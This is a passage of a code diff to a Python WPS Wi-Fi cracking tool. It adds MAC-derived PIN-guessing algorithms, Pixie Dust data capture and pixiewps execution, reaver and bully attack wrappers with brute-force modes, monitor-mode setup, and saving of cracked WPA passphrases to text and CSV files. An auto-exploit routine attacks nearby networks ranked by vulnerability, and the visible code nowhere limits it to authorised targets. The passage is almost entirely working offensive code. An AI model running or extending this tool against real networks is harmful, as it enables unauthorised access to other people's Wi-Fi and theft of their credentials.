+        nic = mac.integer & 0xFFFFFF
+        return (nic * 2) & 0xFFFFFF
+
+    def pinNIC3(self, mac):
+        """NIC tripled — lower 24 bits multiplied by 3."""
+        nic = mac.integer & 0xFFFFFF
+        return (nic * 3) & 0xFFFFFF
+
+    def pinOUIaddNIC(self, mac):
+        """OUI + NIC sum — upper 24 bits added to lower 24 bits."""
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return (oui + nic) & 0xFFFFFF
+
+    def pinOUIxorNIC(self, mac):
+        """OUI XOR NIC — upper 24 bits XORed with lower 24 bits."""
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return oui ^ nic
+
 
 # ---------------------------------------------------------------------------
 # PixiewpsData
 # ---------------------------------------------------------------------------
 class PixiewpsData:
-    _HEX_FIELDS = {
+    """Collects WPS cryptographic exchange data and drives pixiewps.
+
+    Supports all pixiewps fields including optional nonces (r_nonce,
+    e_s1, e_s2, r_s1, r_s2), can parse fields from wpa_supplicant,
+    reaver, and bully output, execute pixiewps, and serialise for
+    JSON/database storage.
+    """
+
+    # Required fields and their expected hex-character lengths
+    _REQUIRED_HEX_FIELDS = {
         'pke': 384, 'pkr': 384, 'e_nonce': 32,
         'authkey': 64, 'e_hash1': 64, 'e_hash2': 64,
     }
+    # Optional fields — used when available for faster / wider cracking
+    _OPTIONAL_HEX_FIELDS = {
+        'r_nonce': 32, 'e_s1': 32, 'e_s2': 32,
+        'r_s1': 32, 'r_s2': 32,
+    }
+    # Union of both for validation
+    _ALL_HEX_FIELDS = {**_REQUIRED_HEX_FIELDS, **_OPTIONAL_HEX_FIELDS}
+
+    # ---------- regex patterns for backend output parsing ----------
+    # wpa_supplicant verbose / trace output
+    _RE_WPA = {
+        'pke':     re.compile(r'WPS:\s*PKE\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'pkr':     re.compile(r'WPS:\s*PKR\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'e_nonce': re.compile(r'WPS:\s*E-Nonce\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'r_nonce': re.compile(r'WPS:\s*R-Nonce\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'authkey': re.compile(r'WPS:\s*AuthKey\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'e_hash1': re.compile(r'WPS:\s*E-Hash1\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'e_hash2': re.compile(r'WPS:\s*E-Hash2\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'e_s1':    re.compile(r'WPS:\s*E-S1\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'e_s2':    re.compile(r'WPS:\s*E-S2\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'r_s1':    re.compile(r'WPS:\s*R-S1\s*[:=]\s*([0-9A-Fa-f]+)'),
+        'r_s2':    re.compile(r'WPS:\s*R-S2\s*[:=]\s*([0-9A-Fa-f]+)'),
+    }
+    # Reaver --pixie-dust / verbose output
+    _RE_REAVER = {
+        'pke':     re.compile(r'\[P\]\s*E-PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'pkr':     re.compile(r'\[P\]\s*R-PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_nonce': re.compile(r'\[P\]\s*E-Nonce\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'r_nonce': re.compile(r'\[P\]\s*R-Nonce\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'authkey': re.compile(r'\[P\]\s*AuthKey\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_hash1': re.compile(r'\[P\]\s*E-Hash1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_hash2': re.compile(r'\[P\]\s*E-Hash2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_s1':    re.compile(r'\[P\]\s*E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_s2':    re.compile(r'\[P\]\s*E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+    }
+    # Bully --pixie-dust / verbose output
+    _RE_BULLY = {
+        'pke':     re.compile(r'PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'pkr':     re.compile(r'PKR\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_nonce': re.compile(r'E-NONCE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'r_nonce': re.compile(r'R-NONCE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'authkey': re.compile(r'AUTHKEY\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_hash1': re.compile(r'E-HASH1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_hash2': re.compile(r'E-HASH2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_s1':    re.compile(r'E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+        'e_s2':    re.compile(r'E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
+    }
+    # Pixiewps result line
+    _RE_PIXIE_PIN = re.compile(r'\[#\]\s*WPS\s+pin\s*[:=]\s*(\d+)', re.I)
+    _RE_PIXIE_PSK = re.compile(r'\[#\]\s*WPA\s+PSK\s*[:=]\s*(.+)', re.I)
 
     def __init__(self):
         self.pke = ''
@@ -422,37 +750,583 @@ class PixiewpsData:
         self.e_hash2 = ''
         self.authkey = ''
         self.e_nonce = ''
+        # Optional fields
+        self.r_nonce = ''
+        self.e_s1 = ''
+        self.e_s2 = ''
+        self.r_s1 = ''
+        self.r_s2 = ''
 
     def clear(self):
+        """Reset all fields to empty strings."""
         self.__init__()
 
-    def got_all(self):
-        return (self.pke and self.pkr and self.e_nonce and self.authkey
-                and self.e_hash1 and self.e_hash2)
+    # ----- Completeness checks -----
 
-    def _validate(self):
-        for name, length in self._HEX_FIELDS.items():
+    def got_all(self):
+        """Return True if all *required* fields are populated."""
+        return all(getattr(self, f) for f in self._REQUIRED_HEX_FIELDS)
+
+    def missing_fields(self):
+        """Return a list of required field names that are still empty."""
+        return [f for f in self._REQUIRED_HEX_FIELDS if not getattr(self, f)]
+
+    def populated_fields(self):
+        """Return a dict of all non-empty fields and their values."""
+        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS
+                if getattr(self, f)}
+
+    def completeness(self):
+        """Return a tuple (filled, total) counting required fields."""
+        filled = sum(1 for f in self._REQUIRED_HEX_FIELDS if getattr(self, f))
+        return filled, len(self._REQUIRED_HEX_FIELDS)
+
+    def status_line(self):
+        """One-line human-readable progress, e.g. '5/6 fields captured (missing: authkey)'."""
+        filled, total = self.completeness()
+        if filled == total:
+            return f'{filled}/{total} fields captured — ready for pixiewps'
+        missing = ', '.join(self.missing_fields())
+        return f'{filled}/{total} fields captured (missing: {missing})'
+
+    # ----- Validation -----
+
+    def _validate(self, strict=True):
+        """Validate hex field lengths and character sets.
+
+        If *strict* is True (default) missing required fields raise
+        ValueError.  If False only populated fields are checked.
+        """
+        fields = self._REQUIRED_HEX_FIELDS if strict else {}
+        for name, length in self._ALL_HEX_FIELDS.items():
             v = getattr(self, name)
-            if len(v) != length:
+            if not v:
+                if name in fields:
+                    raise ValueError(f'Required field {name} is empty')
+                continue
+            v_upper = v.upper()
+            if len(v_upper) != length:
                 raise ValueError(
-                    f'Field {name} has length {len(v)}, expected {length}')
-            if not all(c in '0123456789ABCDEF' for c in v):
+                    f'Field {name} has length {len(v_upper)}, expected {length}')
+            if not all(c in '0123456789ABCDEF' for c in v_upper):
                 raise ValueError(f'Field {name} is not valid hex')
 
-    def get_pixie_args(self, full_range=False):
-        """Return pixiewps argv list; validates all fields are safe hex."""
+    # ----- Command building -----
+
+    def get_pixie_args(self, full_range=False, timeout=None):
+        """Return pixiewps argv list; validates all required fields.
+
+        Args:
+            full_range: Append ``--force`` for exhaustive search.
+            timeout:    Optional timeout in seconds (``--timeout``).
+        """
         self._validate()
         args = ['pixiewps',
                 '--pke', self.pke, '--pkr', self.pkr,
                 '--e-hash1', self.e_hash1, '--e-hash2', self.e_hash2,
                 '--authkey', self.authkey, '--e-nonce', self.e_nonce]
+        # Optional fields — include only when present
+        if self.r_nonce:
+            args.extend(['--r-nonce', self.r_nonce])
+        if self.e_s1:
+            args.extend(['--e-s1', self.e_s1])
+        if self.e_s2:
+            args.extend(['--e-s2', self.e_s2])
+        if self.r_s1:
+            args.extend(['--r-s1', self.r_s1])
+        if self.r_s2:
+            args.extend(['--r-s2', self.r_s2])
         if full_range:
             args.append('--force')
+        if timeout is not None:
+            args.extend(['--timeout', str(int(timeout))])
         return args
 
-    def get_pixie_cmd(self, full_range=False):
+    def get_pixie_cmd(self, full_range=False, timeout=None):
         """Human-readable command (for --show-pixie-cmd / logs)."""
-        return ' '.join(self.get_pixie_args(full_range))
+        return ' '.join(self.get_pixie_args(full_range, timeout))
+
+    # ----- Execute pixiewps -----
+
+    def run_pixiewps(self, full_range=False, timeout=None, verbose=False):
+        """Execute pixiewps and return (pin, psk) or (None, None).
+
+        Args:
+            full_range: Pass ``--force`` for full brute-force range.
+            timeout:    Timeout in seconds passed to pixiewps.
+            verbose:    If True, print pixiewps stdout in real time.
+
+        Returns:
+            Tuple of ``(pin_str, psk_str)``.  Both are ``None`` on
+            failure.
+        """
+        if not shutil.which('pixiewps'):
+            print('[!] pixiewps not found in PATH')
+            return None, None
+
+        args = self.get_pixie_args(full_range, timeout)
+        try:
+            proc = subprocess.run(
+                args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8', errors='replace', timeout=timeout or 300)
+        except subprocess.TimeoutExpired:
+            print('[!] pixiewps timed out')
+            return None, None
+        except Exception as e:
+            print(f'[!] pixiewps execution error: {e}')
+            return None, None
+
+        output = proc.stdout or ''
+        if verbose:
+            for line in output.splitlines():
+                print(f'  [pixiewps] {line}')
+
+        pin = None
+        psk = None
+        for line in output.splitlines():
+            m = self._RE_PIXIE_PIN.search(line)
+            if m:
+                pin = m.group(1)
+            m = self._RE_PIXIE_PSK.search(line)
+            if m:
+                psk = m.group(1).strip()
+        return pin, psk
+
+    # ----- Backend output parsers -----
+
+    def _parse_output(self, text, patterns):
+        """Apply a dict of compiled regexes to *text*, setting fields."""
+        count = 0
+        for field, rx in patterns.items():
+            m = rx.search(text)
+            if m:
+                value = m.group(1).upper().strip()
+                if value and not getattr(self, field):
+                    setattr(self, field, value)
+                    count += 1
+        return count
+
+    def from_wpa_supplicant(self, text):
+        """Parse WPS cryptographic fields from wpa_supplicant output.
+
+        Args:
+            text: Raw output string from wpa_supplicant (verbose mode).
+
+        Returns:
+            Number of new fields captured.
+        """
+        return self._parse_output(text, self._RE_WPA)
+
+    def from_reaver(self, text):
+        """Parse Pixie Dust fields from reaver output.
+
+        Args:
+            text: Raw output string from ``reaver --pixie-dust``.
+
+        Returns:
+            Number of new fields captured.
+        """
+        return self._parse_output(text, self._RE_REAVER)
+
+    def from_bully(self, text):
+        """Parse Pixie Dust fields from bully output.
+
+        Args:
+            text: Raw output string from ``bully --pixie-dust``.
+
+        Returns:
+            Number of new fields captured.
+        """
+        return self._parse_output(text, self._RE_BULLY)
+
+    def from_any_backend(self, text):
+        """Try all backend parsers in order; return total new fields captured."""
+        total = self.from_wpa_supplicant(text)
+        total += self.from_reaver(text)
+        total += self.from_bully(text)
+        return total
+
+    # ----- Serialisation -----
+
+    def to_dict(self):
+        """Serialise all fields to a dict (only non-empty values)."""
+        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS
+                if getattr(self, f)}
+
+    @classmethod
+    def from_dict(cls, data):
+        """Create a PixiewpsData instance from a dict of field values."""
+        obj = cls()
+        for field in cls._ALL_HEX_FIELDS:
+            v = data.get(field, '')
+            if v:
+                setattr(obj, field, v.upper().strip())
+        return obj
+
+    def to_json(self):
+        """Return a JSON string of populated fields."""
+        import json
+        return json.dumps(self.to_dict(), indent=2)
+
+    @classmethod
+    def from_json(cls, json_str):
+        """Create a PixiewpsData instance from a JSON string."""
+        import json
+        return cls.from_dict(json.loads(json_str))
+
+    def __repr__(self):
+        filled, total = self.completeness()
+        extras = sum(1 for f in self._OPTIONAL_HEX_FIELDS if getattr(self, f))
+        return (f'PixiewpsData({filled}/{total} required, '
+                f'{extras} optional, '
+                f'ready={self.got_all()})')
+
+
+# ---------------------------------------------------------------------------
+# Attack backends — reaver & bully
+# ---------------------------------------------------------------------------
+BACKEND_INTERNAL = 'internal'
+BACKEND_REAVER = 'reaver'
+BACKEND_BULLY = 'bully'
+BACKENDS = (BACKEND_INTERNAL, BACKEND_REAVER, BACKEND_BULLY)
+
+
+class AttackResult:
+    """Unified result object returned by every attack backend."""
+    __slots__ = ('success', 'pin', 'psk', 'essid', 'error')
+
+    def __init__(self, success=False, pin='', psk='', essid='', error=''):
+        self.success = success
+        self.pin = pin
+        self.psk = psk
+        self.essid = essid
+        self.error = error
+
+    def __bool__(self):
+        return self.success
+
+    def __repr__(self):
+        if self.success:
+            return (f'AttackResult(success=True, pin={self.pin!r}, '
+                    f'psk={self.psk!r}, essid={self.essid!r})')
+        return f'AttackResult(success=False, error={self.error!r})'
+
+
+def setup_monitor_mode(iface):
+    """Put *iface* into monitor mode and return the monitor interface name.
+
+    Tries ``airmon-ng`` first (cleaner process-kill and naming);
+    falls back to raw ``iw`` commands.
+    """
+    # Kill interfering daemons
+    if shutil.which('airmon-ng'):
+        subprocess.run(['airmon-ng', 'check', 'kill'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        r = subprocess.run(['airmon-ng', 'start', iface],
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                           encoding='utf-8', errors='replace')
+        # Parse airmon-ng output for the monitor interface name
+        for line in (r.stdout or '').splitlines():
+            m = re.search(r'\b(\w+mon)\b', line)
+            if m:
+                return m.group(1)
+        # Common convention: wlan0 -> wlan0mon
+        mon = iface + 'mon'
+        if os.path.exists(f'/sys/class/net/{mon}'):
+            return mon
+        # Sometimes airmon-ng renames in-place
+        return iface
+
+    # Fallback: manual iw monitor mode (in-place)
+    subprocess.run(['ip', 'link', 'set', iface, 'down'],
+                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(['iw', iface, 'set', 'monitor', 'none'],
+                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(['ip', 'link', 'set', iface, 'up'],
+                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return iface
+
+
+def teardown_monitor_mode(iface, original_iface):
+    """Restore *original_iface* to managed mode (best-effort)."""
+    if shutil.which('airmon-ng'):
+        subprocess.run(['airmon-ng', 'stop', iface],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    else:
+        subprocess.run(['ip', 'link', 'set', iface, 'down'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(['iw', iface, 'set', 'type', 'managed'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(['ip', 'link', 'set', original_iface, 'up'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
+class ReaverAttacker:
+    """Attack backend wrapping the *reaver* WPS cracking tool.
+
+    Reaver handles the complete WPS registration protocol (M1–M8)
+    internally and supports Pixie Dust (``-K``), online brute-force,
+    and single-PIN verification.
+    """
+
+    def __init__(self, interface, verbose=False, timeout=300,
+                 delay=None, json_mode=False):
+        self.interface = interface
+        self.verbose = verbose
+        self.timeout = timeout
+        self.delay = delay
+        self.json_mode = json_mode
+
+    @staticmethod
+    def is_available():
+        return shutil.which('reaver') is not None
+
+    # ---- attack methods ---------------------------------------------------
+    def pixie_dust(self, bssid, channel=None):
+        """Run offline Pixie Dust attack via ``reaver -K 1``."""
+        argv = self._base_argv(bssid, channel)
+        argv += ['-K', '1']
+        return self._run(argv, label='Pixie Dust (reaver)')
+
+    def bruteforce(self, bssid, channel=None, start_pin=None):
+        """Run online brute-force via reaver's built-in sequencer."""
+        argv = self._base_argv(bssid, channel)
+        if self.delay is not None:
+            argv += ['-d', str(int(self.delay))]
+        if start_pin:
+            argv += ['-p', start_pin]
+        return self._run(argv, label='Brute-force (reaver)',
+                         timeout=self.timeout * 10)
+
+    def single_pin(self, bssid, pin, channel=None):
+        """Test a single WPS PIN."""
+        argv = self._base_argv(bssid, channel)
+        argv += ['-p', pin]
+        return self._run(argv, label=f'PIN {pin} (reaver)')
+
+    # ---- internals --------------------------------------------------------
+    def _base_argv(self, bssid, channel=None):
+        argv = ['reaver', '-i', self.interface, '-b', bssid]
+        if channel:
+            argv += ['-c', str(channel)]
+        if self.verbose:
+            argv += ['-vv']
+        else:
+            argv += ['-v']
+        # Disable WPS lock detection (we handle it ourselves)
+        argv += ['-L', '-N']
+        return argv
+
+    def _run(self, argv, label='reaver', timeout=None):
+        timeout = timeout or self.timeout
+        print(f'[*] Running {label}…')
+        if self.verbose:
+            print(f'[D] {" ".join(argv)}')
+        try:
+            proc = subprocess.run(
+                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8', errors='replace', timeout=timeout)
+        except subprocess.TimeoutExpired:
+            print(f'[!] {label} timed out after {timeout}s')
+            return AttackResult(error='timeout')
+        except FileNotFoundError:
+            print('[!] reaver binary not found in PATH')
+            return AttackResult(error='not_found')
+
+        output = proc.stdout or ''
+        if self.verbose:
+            print(output)
+
+        return self._parse_output(output)
+
+    @staticmethod
+    def _parse_output(output):
+        """Extract credentials from reaver stdout."""
+        pin = psk = essid = ''
+        for line in output.splitlines():
+            m = re.search(r"\[\+\]\s*WPS\s*PIN:\s*'([^']*)'", line)
+            if m:
+                pin = m.group(1)
+            m = re.search(r"\[\+\]\s*WPA\s*PSK:\s*'([^']*)'", line)
+            if m:
+                psk = m.group(1)
+            m = re.search(r"\[\+\]\s*AP\s*SSID:\s*'([^']*)'", line)
+            if m:
+                essid = m.group(1)
+        if pin or psk:
+            return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
+        # Check for common failure messages
+        if 'WPS transaction failed' in output:
+            return AttackResult(error='wps_transaction_failed')
+        if 'WARNING: Detected AP rate limiting' in output:
+            return AttackResult(error='rate_limited')
+        if 'AP has locked its WPS' in output or 'WPS lockout' in output:
+            return AttackResult(error='wps_locked')
+        return AttackResult(error='no_result')
+
+
+class BullyAttacker:
+    """Attack backend wrapping the *bully* WPS cracking tool.
+
+    Bully is an alternative WPS attack implementation that is often
+    more effective on certain Broadcom and Realtek chipsets.
+    """
+
+    def __init__(self, interface, verbose=False, timeout=300,
+                 delay=None, json_mode=False):
+        self.interface = interface
+        self.verbose = verbose
+        self.timeout = timeout
+        self.delay = delay
+        self.json_mode = json_mode
+
+    @staticmethod
+    def is_available():
+        return shutil.which('bully') is not None
+
+    # ---- attack methods ---------------------------------------------------
+    def pixie_dust(self, bssid, channel=None):
+        """Run offline Pixie Dust attack via ``bully -d``."""
+        argv = self._base_argv(bssid, channel)
+        argv += ['-d']
+        return self._run(argv, label='Pixie Dust (bully)')
+
+    def bruteforce(self, bssid, channel=None, start_pin=None):
+        """Run online brute-force via bully's built-in sequencer."""
+        argv = self._base_argv(bssid, channel)
+        if start_pin:
+            argv += ['-p', start_pin]
+        return self._run(argv, label='Brute-force (bully)',
+                         timeout=self.timeout * 10)
+
+    def single_pin(self, bssid, pin, channel=None):
+        """Test a single WPS PIN."""
+        argv = self._base_argv(bssid, channel)
+        argv += ['-p', pin]
+        return self._run(argv, label=f'PIN {pin} (bully)')
+
+    # ---- internals --------------------------------------------------------
+    def _base_argv(self, bssid, channel=None):
+        argv = ['bully', '-b', bssid]
+        if channel:
+            argv += ['-c', str(channel)]
+        if self.verbose:
+            argv += ['-v', '4']
+        else:
+            argv += ['-v', '2']
+        if self.delay is not None:
+            argv += ['-l', str(int(self.delay))]
+        # Interface is the last positional argument for bully
+        argv.append(self.interface)
+        return argv
+
+    def _run(self, argv, label='bully', timeout=None):
+        timeout = timeout or self.timeout
+        print(f'[*] Running {label}…')
+        if self.verbose:
+            print(f'[D] {" ".join(argv)}')
+        try:
+            proc = subprocess.run(
+                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8', errors='replace', timeout=timeout)
+        except subprocess.TimeoutExpired:
+            print(f'[!] {label} timed out after {timeout}s')
+            return AttackResult(error='timeout')
+        except FileNotFoundError:
+            print('[!] bully binary not found in PATH')
+            return AttackResult(error='not_found')
+
+        output = proc.stdout or ''
+        if self.verbose:
+            print(output)
+
+        return self._parse_output(output)
+
+    @staticmethod
+    def _parse_output(output):
+        """Extract credentials from bully stdout."""
+        pin = psk = essid = ''
+        for line in output.splitlines():
+            # Bully format: [+] Pin is '12345670', key is 'password'
+            m = re.search(
+                r"\[\+\]\s*Pin\s+is\s+'([^']*)',\s*key\s+is\s+'([^']*)'",
+                line)
+            if m:
+                pin, psk = m.group(1), m.group(2)
+                continue
+            # Alternative format: [*] Pin: XXXXXXXX
+            m = re.search(r"\[\*\]\s*Pin:\s*(\S+)", line)
+            if m and not pin:
+                pin = m.group(1)
+            # Alternative format: [*] Key: xxxxxxxxx
+            m = re.search(r"\[\*\]\s*Key:\s*(.+)", line)
+            if m and not psk:
+                psk = m.group(1).strip()
+            # SSID extraction
+            m = re.search(r"SSID:\s*'([^']*)'", line)
+            if m and not essid:
+                essid = m.group(1)
+            m = re.search(r"for\s+'([^']+)'", line)
+            if m and not essid:
+                essid = m.group(1)
+        if pin or psk:
+            return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
+        if 'WPS lockout' in output or 'locked' in output.lower():
+            return AttackResult(error='wps_locked')
+        return AttackResult(error='no_result')
+
+
+def _handle_backend_result(result, bssid, db=None, save_result=False,
+                           reports_dir=None, json_mode=False):
+    """Print and persist an AttackResult from an external backend."""
+    if not result.success:
+        if result.error == 'wps_locked':
+            print(f'[-] AP {bssid} has locked its WPS interface')
+        elif result.error == 'rate_limited':
+            print(f'[!] AP {bssid} rate-limiting detected — back off')
+        elif result.error == 'timeout':
+            pass   # already printed by the attacker
+        elif result.error == 'not_found':
+            pass
+        else:
+            print(f'[-] Attack unsuccessful against {bssid}')
+        return False
+
+    print(f"[+] WPS PIN: '{result.pin}'")
+    print(f"[+] WPA PSK: '{result.psk}'")
+    if result.essid:
+        print(f"[+] AP SSID: '{result.essid}'")
+
+    if json_mode:
+        rec = {
+            'ts': datetime.now().isoformat(),
+            'event': 'credentials',
+            'wps_pin': result.pin,
+            'wpa_psk': result.psk,
+            'essid': result.essid,
+            'bssid': bssid,
+        }
+        print(json.dumps(rec, ensure_ascii=False), flush=True)
+
+    if db:
+        db.save_credentials(bssid, result.essid, result.pin, result.psk)
+
+    if save_result and reports_dir:
+        os.makedirs(reports_dir, exist_ok=True)
+        filename = reports_dir + 'stored'
+        dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
+        with open(filename + '.txt', 'a', encoding='utf-8') as f:
+            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {result.essid}\n'
+                    f'WPS PIN: {result.pin}\nWPA PSK: {result.psk}\n\n')
+        header = not os.path.isfile(filename + '.csv')
+        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
+            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
+            if header:
+                w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
+            w.writerow([dateStr, bssid, result.essid, result.pin, result.psk])
+        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
+
+    return True
 
 
 # ---------------------------------------------------------------------------
@@ -784,6 +1658,10 @@ class Companion:
                 self.pixie_creds.e_nonce = get_hex(line)
                 if pixiemode:
                     print(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
+            elif 'Registrar Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.r_nonce = get_hex(line)
+                if pixiemode:
+                    print(f'[P] R-Nonce: {self.pixie_creds.r_nonce}')
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
                 if pixiemode:
@@ -804,6 +1682,14 @@ class Companion:
                 self.pixie_creds.e_hash2 = get_hex(line)
                 if pixiemode:
                     print(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
+            elif 'E-S1' in line and 'hexdump' in line:
+                self.pixie_creds.e_s1 = get_hex(line)
+                if pixiemode:
+                    print(f'[P] E-S1: {self.pixie_creds.e_s1}')
+            elif 'E-S2' in line and 'hexdump' in line:
+                self.pixie_creds.e_s2 = get_hex(line)
+                if pixiemode:
+                    print(f'[P] E-S2: {self.pixie_creds.e_s2}')
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = bytes.fromhex(
@@ -868,8 +1754,11 @@ class Companion:
     # ---- pixiewps invocation ---------------------------------------------
     def __runPixiewps(self, showcmd=False, full_range=False, _retry=True):
         self.__print_with_indicators('*', 'Running Pixiewps…')
+        self.__print_with_indicators(
+            'P', self.pixie_creds.status_line())
         try:
-            argv = self.pixie_creds.get_pixie_args(full_range)
+            argv = self.pixie_creds.get_pixie_args(
+                full_range, timeout=self.pixiewps_timeout)
         except ValueError as e:
             print(f'[!] Pixiewps data validation failed: {e}')
             return False
@@ -1117,7 +2006,8 @@ class Companion:
                         bssid, pin, pixiemode=False,
                         store_pin_on_fail=True)
                 return False
-            print('[!] Not enough data to run Pixie Dust attack')
+            print(f'[!] Not enough data to run Pixie Dust attack '
+                  f'({self.pixie_creds.status_line()})')
             return False
         else:
             if store_pin_on_fail:
@@ -1215,6 +2105,7 @@ class WiFiScanner:
         self.db = db
         self.selected_vuln = False
         self.selected_chipset = ''
+        self.selected_channel = 0
 
         self.stored = []
         reports = os.path.dirname(os.path.realpath(__file__)) \
@@ -1248,6 +2139,7 @@ class WiFiScanner:
                 'Security type': 'Unknown', 'WPS': False,
                 'WPS locked': False, 'Model': '',
                 'Model number': '', 'Device name': '',
+                'Channel': 0, 'Frequency': 0,
             })
             networks[-1]['BSSID'] = result.group(1).upper()
 
@@ -1292,6 +2184,18 @@ class WiFiScanner:
         def handle_deviceName(line, result, networks):
             networks[-1]['Device name'] = _decode(result.group(1))
 
+        def handle_frequency(line, result, networks):
+            freq = int(result.group(1))
+            networks[-1]['Frequency'] = freq
+            if 2412 <= freq <= 2484:
+                networks[-1]['Channel'] = 14 if freq == 2484 else (freq - 2412) // 5 + 1
+            elif 5180 <= freq <= 5825:
+                networks[-1]['Channel'] = (freq - 5000) // 5
+            elif 5955 <= freq <= 7115:  # 6 GHz band
+                networks[-1]['Channel'] = (freq - 5950) // 5
+            else:
+                networks[-1]['Channel'] = 0
+
         cmd = f'iw dev {self.interface} scan'
         proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT,
@@ -1301,6 +2205,7 @@ class WiFiScanner:
         matchers = {
             re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
             re.compile(r'SSID: (.*)'): handle_essid,
+            re.compile(r'freq: (\d+)'): handle_frequency,
             re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
             re.compile(r'(capability): (.+)'): handle_securityType,
             re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
@@ -1372,8 +2277,8 @@ class WiFiScanner:
                 colored('Already stored', 'yellow'),
                 colored('Pixie-vulnerable', 'cyan')))
         print('Networks list:')
-        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR',
+        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<4} {:<27} {:<}'.format(
+            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ch',
             'WSC device name', 'WSC model'))
 
         items = list(network_list.items())
@@ -1383,12 +2288,14 @@ class WiFiScanner:
             model = f"{net['Model']} {net['Model number']}".strip()
             essid = truncateStr(net.get('ESSID', 'HIDDEN'), 25)
             dev = truncateStr(net['Device name'], 27)
+            ch = str(net.get('Channel', ''))
             line = ' '.join([
                 truncateStr(f'{n})', 4),
                 truncateStr(net['BSSID'], 18),
                 essid,
                 truncateStr(net['Security type'], 8),
                 truncateStr(str(net['Level']), 4),
+                truncateStr(ch, 4),
                 dev,
                 model,
             ])
@@ -1420,6 +2327,7 @@ class WiFiScanner:
                     target = networks[idx]
                     self.selected_vuln = target.get('Pixie vulnerable', False)
                     self.selected_chipset = target.get('Chipset', '')
+                    self.selected_channel = target.get('Channel', 0)
                     return target['BSSID']
                 raise IndexError
             except (ValueError, IndexError):
@@ -1438,6 +2346,60 @@ def auto_exploit(interface, args, db):
     order = sorted(networks.values(),
                    key=lambda n: (not n['Pixie vulnerable'],
                                   n['WPS locked'], -n['Level']))
+
+    backend = getattr(args, 'backend', BACKEND_INTERNAL)
+    reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+
+    # ------- External backends (reaver / bully) ----------------------------
+    if backend in (BACKEND_REAVER, BACKEND_BULLY):
+        attacker_cls = ReaverAttacker if backend == BACKEND_REAVER else BullyAttacker
+        if not attacker_cls.is_available():
+            print(f'[!] {backend} is not installed or not in PATH')
+            return
+
+        print(f'[*] Switching {interface} to monitor mode…')
+        mon_iface = setup_monitor_mode(interface)
+        print(f'[+] Monitor interface: {mon_iface}')
+
+        try:
+            attacker = attacker_cls(
+                mon_iface, verbose=args.verbose,
+                timeout=args.timeout, delay=args.delay,
+                json_mode=args.json)
+
+            for net in order:
+                if net['WPS locked']:
+                    print(f"[i] Skipping {net['BSSID']} (WPS locked)")
+                    continue
+                if args.pixie_only and not net['Pixie vulnerable']:
